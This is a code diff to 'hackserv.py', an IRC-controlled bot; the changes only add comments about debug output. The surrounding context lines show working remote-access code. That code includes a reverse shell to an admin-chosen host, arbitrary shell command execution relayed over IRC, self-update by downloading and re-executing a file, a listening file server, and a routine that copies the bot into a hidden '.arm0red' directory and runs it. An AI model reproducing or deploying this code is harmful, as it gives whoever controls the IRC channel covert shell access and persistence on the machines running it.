@@ -50,8 +50,8 @@ import urllib.request
 from requests import get
 starttime = datetime.datetime.utcnow() # Start time is used to calculate uptime.
 ip = get('https://api.ipify.org').text # Get public IP address. (used to set botnick-to-ip as well as the '.ip' command.)
-sys.path.insert(0, '/usr/local/bin/')
-from hsConfig import *
+sys.path.insert(0, '/usr/local/bin/') # Working directory.
+from hsConfig import * # import the hsConfig.py file.
 lastping = time.time() # Time at last PING.
 threshold = 200 # Ping timeout before reconnect.
 ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Set ircsock variable.
@@ -190,7 +190,7 @@ def rShell(rsHost, rsPort): # Open a reverse shell on this device.
         rs.connect_ex((str(rsHost), int(rsPort)))
         rs.sendto(str.encode("[+] Connection established!"), (str(rsHost), int(rsPort)))
         rsConnected = True
-        if debugmode:
+        if debugmode: # If debugmode is True, msgs will print to screen.
             print("[+] Connection established with " + rsHost + ":" + rsPort + "!")
         while rsConnected:
             try:
@@ -213,7 +213,7 @@ def rShell(rsHost, rsPort): # Open a reverse shell on this device.
                     print("rShell Exception: " + str(rsex))
                     rsConnected = False
     except Exception as rsconnex:
-        if debugmode:
+        if debugmode: # If debugmode is True, msgs will print to screen.
             print("rShell Socket Connection Exception: " + str(rsconnex))
     rs.close()
     
@@ -223,16 +223,16 @@ def runcmd(sc): # Run shell commands on this device.
         line = proc.stdout.readline()
         line_str = str(line, "UTF-8")
         if line == b'' and proc.poll() is not None:
-            if debugmode:
+            if debugmode: # If debugmode is True, msgs will print to screen.
                 print("End of .cmd output.")
             sendntc("Shell>", adminname)
             return
         if line:
-            if debugmode:
+            if debugmode: # If debugmode is True, msgs will print to screen.
                 print(format(line_str))
             sendntc("Shell> " + format(line_str), adminname)
     pp = proc.poll()
-    if debugmode:
+    if debugmode: # If debugmode is True, msgs will print to screen.
         print(pp)
     sendntc(pp, adminname)
     sendntc("Shell> Done.", adminname)
@@ -260,17 +260,17 @@ def chFileMod(modFile, modType): # Change the file permissions. (chmod)
     sendntc(str(modFile) +" mode was changed to: "+ str(modType) +"!", adminname)
 
 def update(link, dlFile): # Update bot.
-    if debugmode:
+    if debugmode: # If debugmode is True, msgs will print to screen.
         print("[==>] Downloading update file: "+ str(dlFile))
     download(link, dlFile) # Download the updated file.
-    if debugmode:
+    if debugmode: # If debugmode is True, msgs will print to screen.
         print("[chmod +x] Making "+ str(dlFile) +" executable!")
     chFileMod(dlFile, 0o755) # Make the file executable.
-    if debugmode:
+    if debugmode: # If debugmode is True, msgs will print to screen.
         print("[<==] Backing up old hackserv.py and renaming "+ str(dlFile) +" to hackserv.py")
     os.rename("hackserv.py", "hackserv.py.bak") # Backup the original 'hackserv.py' file.
     os.rename(str(dlFile), "hackserv.py") # Rename the new file to 'hackserv.py'
-    if debugmode:
+    if debugmode: # If debugmode is True, msgs will print to screen.
         print("[+] Restarting hackserv.py!")
     os.execv(__file__, sys.argv) # Exit the old process and start the new one.
     sendntc("[*] Success! "+ str(dlFile) +" was renamed and old 'hackserv.py' was successsfully backed up and updated!", adminname)
@@ -297,12 +297,12 @@ def fileServer(): # Open a file server on this device.
     s = socket.socket()
     s.bind((host, port))
     s.listen(5)
-    if debugmode:
+    if debugmode: # If debugmode is True, msgs will print to screen.
         print("[*] File Server (Download) started!")
     sendntc("[*] File Server (Download) started!", adminname)
     while True:
         c, addr = s.accept()
-        if debugmode:
+        if debugmode: # If debugmode is True, msgs will print to screen.
             print("[+] Client connected ip: " + str(addr))
         sendntc("[+] Client connected ip: " + str(addr), adminname)
         t = threading.Thread(target=retrieveFile, args=("retreiveThread", c, addr))
@@ -311,7 +311,7 @@ def fileServer(): # Open a file server on this device.
 
 def fileList(): # List files in current directory
     dirList = os.walk('.', topdown=True, onerror=None, followlinks=False) # walk through current directory.
-    if debugmode:
+    if debugmode: # If debugmode is True, msgs will print to screen.
         print(dirList) # Print the file list to screen if debugmode is enabled.
 
 def srtChk(): # Startup Check. (Still in testing!)
@@ -320,37 +320,37 @@ def srtChk(): # Startup Check. (Still in testing!)
     hdPath = hd + '/.arm0red'
     clone = hdPath + '/.hackserv.py'
     if name == clone:
-        if debugmode:
+        if debugmode: # If debugmode is True, msgs will print to screen.
             print(name + " and "+ clone + " are the same file!")
             connect()
             #print("Cloned bot is already running!")
     else:
         try:
-            if debugmode:
+            if debugmode: # If debugmode is True, msgs will print to screen.
                 print("NAME: " + name)
                 print("CLONE: " + clone)
                 print("HOME DIR: " + hd)
             if os.path.isdir(hdPath) and os.path.exists(hdPath):
-                if debugmode:
+                if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Directory Exists: " + hdPath)
             else:
-                if debugmode:
+                if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Creating Directory: " + hdPath)
                 os.mkdir(hdPath)#, 0700)
             if os.path.isfile(clone):
-                if debugmode:
+                if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Bot File Exists: " + clone)
             else:
                 if name != clone:
-                    if debugmode:
+                    if debugmode: # If debugmode is True, msgs will print to screen.
                         print("Copying " + name + " to: " + clone)
                     os.system("cp " + name + " " + clone)
-            if debugmode:
+            if debugmode: # If debugmode is True, msgs will print to screen.
                 print("Running: " + clone)
                 runcmd(clone)
                 #os.system(clone)
         except OSError as mdr:
-            if debugmode:
+            if debugmode: # If debugmode is True, msgs will print to screen.
                 print("ERROR: " + str(mdr))
 
 def main(): # This is the main function for all of the bot controls.
@@ -367,19 +367,19 @@ def main(): # This is the main function for all of the bot controls.
         # SASL Authentication.
         if ircmsg.find("ACK :sasl") != -1:
             if usesasl:
-                if debugmode:
+                if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Authenticating with SASL PLAIN.") # Request PLAIN Auth.
                 ircsend("AUTHENTICATE PLAIN")
         if ircmsg.find("AUTHENTICATE +") != -1:
             if usesasl:
-                if debugmode:
+                if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Sending %s Password: %s to SASL." % (nickserv, nspass))
                 authpass = botnick + '\x00' + botnick + '\x00' + nspass
                 ap_encoded = str(base64.b64encode(authpass.encode("UTF-8")), "UTF-8")
                 ircsend("AUTHENTICATE " + ap_encoded) # Authenticate with SASL.
         if ircmsg.find("SASL authentication successful") != -1:
             if usesasl:
-                if debugmode:
+                if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Sending CAP END command.")
                 ircsend("CAP END") # End the SASL Authentication.
         
@@ -723,7 +723,7 @@ def main(): # This is the main function for all of the bot controls.
 
                 # Respond to '.rsh [target] [port]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.rsh') != -1:
-                    if enableshell:
+                    if enableshell: # If enableshell is True, you can use this command.
                         target = message.split(' ', 1)[1]
                         if target.find(' ') != -1:
                             port = target.split(' ', 1)[1]
@@ -743,7 +743,7 @@ def main(): # This is the main function for all of the bot controls.
 
                 # Respond to '.cmd [shell command]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.cmd') != -1:
-                    if enableshell:
+                    if enableshell: # If enableshell is True, you can use this command.
                         if message.split(' ', 1)[1] != -1:
                             shellcmd = message.split(' ', 1)[1]
                             message = "Shell> " + shellcmd
@@ -757,7 +757,7 @@ def main(): # This is the main function for all of the bot controls.
                 
                 # Respond to '.cno [shell command]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.cno') != -1:
-                    if enableshell:
+                    if enableshell: # If enableshell is True, you can use this command.
                         if message.split(' ', 1)[1] != -1:
                             shellcmd = message.split(' ', 1)[1]
                             message = "Shell> " + shellcmd
@@ -779,7 +779,7 @@ def main(): # This is the main function for all of the bot controls.
             if ircmsg.find("PING") != -1: # Reply to PINGs.
                 nospoof = ircmsg.split(' ', 1)[1] # Unrealircd 'nospoof' compatibility.
                 ircsend("PONG " + nospoof)
-                if debugmode:
+                if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Replying with '"+ nospoof +"'")
                 lastping = time.time() # Set time of last PING.
                 if (time.time() - lastping) >= threshold: # If last PING was longer than set threshold, try and reconnect.
@@ -798,13 +798,13 @@ try: # Here is where we actually start the Bot.
     if not connected:
         #srtChk() # Check if file exists.
         if os.path.isfile('./hsConfig.py'): # Check if the config file exists.
-            if debugmode:
+            if debugmode: # If debugmode is True, msgs will print to screen.
                 print("hsConfig.py found. Starting HackServ...")
             fileList() # Get list of files in current directory.
             connect() # Connect to server.
             
         else:
-            if debugmode:
+            if debugmode: # If debugmode is True, msgs will print to screen.
                 print("hsConfig.py does not exist. Exiting...") 
             sys.exit()
     
